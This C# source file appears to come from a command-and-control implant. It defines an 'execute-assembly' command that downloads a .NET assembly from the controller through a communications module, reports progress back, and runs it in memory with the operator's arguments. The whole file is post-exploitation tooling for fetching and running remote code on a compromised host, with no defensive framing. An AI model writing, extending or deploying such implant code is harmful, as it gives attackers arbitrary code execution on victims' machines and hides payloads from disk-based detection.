﻿using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ExecuteAssemblyCommand : AgentCommand
    {
        public override string Name => "execute-assembly";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            var fileName = task.FileName;
            var fileContent = commm.Download(task.FileId, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
                }).Result;

            this.Notify(result, commm, $"{fileName} Downloaded");

            var args = task.SplittedArgs.ToList();
            args.RemoveAt(0); //filename
            var output = Executor.ExecuteAssembly(fileContent, args.ToArray());

            result.Result = output;
        }
    }
}
